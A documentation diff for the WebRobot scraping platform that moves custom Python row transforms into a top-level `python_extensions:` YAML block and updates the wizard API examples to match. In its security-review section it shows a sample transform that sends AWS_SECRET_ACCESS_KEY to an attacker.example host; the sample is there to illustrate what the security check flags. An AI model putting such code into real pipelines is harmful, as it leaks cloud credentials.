@@ -303,10 +303,10 @@ This is the right extensibility hook for sandbox users: no compile step, no `org
 
 ### How it wires
 
-Two stages do the work:
+The parser supports a **top-level `python_extensions:` block** alongside `pipeline:`. The block declares one or more named functions; the pipeline then references them by name.
 
-- **`python_define`** — registers a Python function for the lifetime of the current pipeline run. The function source lives inline in the YAML.
-- **`python_row_transform:<name>`** — applies that function row-by-row in the dataframe.
+- **`python_extensions:`** — top-level YAML key (NOT a stage). Holds `stages: [{name, type, functionBody}]`. `functionBody` is just the body of the function, indented — the runtime wraps `def name(row): ...` around it before sending the code to the Spark executor.
+- **`python_row_transform:<name>`** — pipeline stage that applies the named function row-by-row.
 
 The function receives a row as a `dict` and returns a `dict`. Anything you want downstream must be in the returned dict (use `{**row, ...}` to preserve fields).
 
@@ -316,6 +316,20 @@ A demo pipeline that scrapes `books.toscrape.com`, then applies a custom Python 
 
 ```yaml
 # books-with-extension.yaml — save-generated-pipeline accepts this directly
+
+# ── extension declarations (top-level, NOT a stage) ──────────────────
+python_extensions:
+  stages:
+    - name: clean_price
+      type: row_transform
+      functionBody: |
+        import re
+        raw = row.get('raw_price', '') or ''
+        m = re.search(r'[\d.,]+', raw)
+        price = float(m.group().replace(',', '.')) if m else None
+        return {**row, 'price': price, 'currency': 'GBP'}
+
+# ── pipeline references the named function by stage ─────────────────
 pipeline:
   - stage: wget
     args: ["https://books.toscrape.com/"]
@@ -325,27 +339,21 @@ pipeline:
       - { name: title, selector: "article.product_pod h3 a", method: "attr:title" }
       - { name: raw_price, selector: "article.product_pod p.price_color", method: "text" }
 
-  # ── extension point ────────────────────────────────────────────────
-  - stage: python_define
-    args:
-      - name: clean_price
-        code: |
-          def clean_price(row):
-              import re
-              raw = row.get('raw_price', '') or ''
-              m = re.search(r'[\d.,]+', raw)
-              price = float(m.group().replace(',', '.')) if m else None
-              return {**row, 'price': price, 'currency': 'GBP'}
-
   - stage: python_row_transform:clean_price
     args: []
-  # ── end extension ──────────────────────────────────────────────────
 
 output:
   format: csv
   mode: overwrite
   path: "${OUTPUT_CSV_PATH}"
 ```
+
+A few things to keep in mind:
+
+- `functionBody` is the **body only** — no `def` line, no signature. The Spark code generator (`PySparkCodeGenerator` → `pyspark_pipeline.mustache`) wraps `def {{name}}(row): ...` around it.
+- The body is indented as you'd indent it inside a `def`. The first statement starts at column 0 of the literal block — the template injects the indent.
+- `type: row_transform` is required; it tells the registry which kind of stage to register.
+- Multiple functions live under `python_extensions.stages`; reference each one in the pipeline via `python_row_transform:<name>`.
 
 Run it through the demo flow exactly like a bundled pipeline:
 
@@ -390,9 +398,9 @@ The relevant skills:
 | Skill | Endpoint | Input | Output |
 | --- | --- | --- | --- |
 | Stages from intent | `POST /webrobot/api/demo/wizard/suggest` | `{"intent":"..."}` | `{"suggested":["wget","wgetExplore",...]}` |
-| Python transform from intent | `POST /webrobot/api/demo/wizard/generate-python-transform` | `{"intent":"...","sampleRow":{...}}` (sampleRow optional) | `{"name":"clean_price","code":"...","valid":true,"security":{"safe":true,"severity":"none"}}` |
-| Validate a Python transform (contract) | `POST /webrobot/api/demo/wizard/validate-python-transform` | `{"code":"def ..."}` | `{"ok":true,"name":"clean_price"}` or `{"ok":false,"issues":[...]}` |
-| Security-check a Python transform (LLM) | `POST /webrobot/api/demo/wizard/security-check-python-transform` | `{"code":"def ..."}` | `{"safe":bool,"severity":"none\|low\|medium\|high\|critical","risks":[...],"summary":"..."}` |
+| Python transform from intent | `POST /webrobot/api/demo/wizard/generate-python-transform` | `{"intent":"...","sampleRow":{...}}` (sampleRow optional) | `{"name":"clean_price","type":"row_transform","functionBody":"import re\n...","valid":true,"security":{"safe":true,"severity":"none"}}` |
+| Validate a Python transform (contract) | `POST /webrobot/api/demo/wizard/validate-python-transform` | `{"functionBody":"..."}` (or legacy `{"code":"def ..."}`) | `{"ok":true,"name":"clean_price"}` or `{"ok":false,"issues":[...]}` |
+| Security-check a Python transform (LLM) | `POST /webrobot/api/demo/wizard/security-check-python-transform` | `{"functionBody":"..."}` (or legacy `{"code":"def ..."}`) | `{"safe":bool,"severity":"none\|low\|medium\|high\|critical","risks":[...],"summary":"..."}` |
 
 The benefit of named skills over raw LLM calls: every client (CLI, demo UI, your own integration) hits the same system prompt and the same output shape — drift between callers is impossible, and the platform owners can iterate the prompt without breaking every consumer.
 
@@ -405,20 +413,23 @@ curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/generate-python
     "sampleRow": {"raw_price": "£12.99"}
   }' | jq .
 
-# → { "name": "clean_price", "code": "def clean_price(row):\n    import re\n    ..." }
+# → { "name": "clean_price", "type": "row_transform",
+#     "functionBody": "import re\nraw = row.get('raw_price', '') or ''\n..." }
 ```
 
-Drop the returned `code` straight into a `python_define` stage:
+Drop the returned `functionBody` straight into a `python_extensions.stages` entry:
 
 ```yaml
-- stage: python_define
-  args:
+python_extensions:
+  stages:
     - name: clean_price
-      code: |
-        # ← paste the `code` field returned by /wizard/generate-python-transform
+      type: row_transform
+      functionBody: |
+        # ← paste the `functionBody` field returned by /wizard/generate-python-transform
 
-- stage: python_row_transform:clean_price
-  args: []
+pipeline:
+  - stage: python_row_transform:clean_price
+    args: []
 ```
 
 This is also the natural shape for an "intent box" widget next to the YAML editor in the demo UI: a textarea, a "generate" button, and the same endpoint. No system prompt in the client, no divergence.
@@ -437,25 +448,24 @@ Hand-written code (path 2) and code copied off the internet need a second pair o
 Recommended flow before saving a pipeline with custom Python:
 
 ```bash
-# 1. static contract
+# 1. static contract — pass either `functionBody` (canonical) or `code` (legacy)
 curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/validate-python-transform \
   -H 'Content-Type: application/json' \
-  -d "$(jq -n --arg c "$CODE" '{code:$c}')" | jq .
+  -d "$(jq -n --arg b "$BODY" '{functionBody:$b}')" | jq .
 
 # 2. LLM security review — fail closed on `safe:false`
 curl -s -X POST https://api.webrobot.eu/webrobot/api/demo/wizard/security-check-python-transform \
   -H 'Content-Type: application/json' \
-  -d "$(jq -n --arg c "$CODE" '{code:$c}')" | jq .
+  -d "$(jq -n --arg b "$BODY" '{functionBody:$b}')" | jq .
 ```
 
-A malicious snippet that tries to exfiltrate env vars:
+A malicious `functionBody` that tries to exfiltrate env vars (remember: the runtime wraps `def name(row):` around this body):
 
 ```python
-def clean_price(row):
-    import os, urllib.request
-    # exfiltrate the executor's secrets to attacker-controlled host
-    urllib.request.urlopen('https://attacker.example/' + os.environ.get('AWS_SECRET_ACCESS_KEY', ''))
-    return {**row, 'price': 0.0}
+import os, urllib.request
+# exfiltrate the executor's secrets to attacker-controlled host
+urllib.request.urlopen('https://attacker.example/' + os.environ.get('AWS_SECRET_ACCESS_KEY', ''))
+return {**row, 'price': 0.0}
 ```
 
 → response:
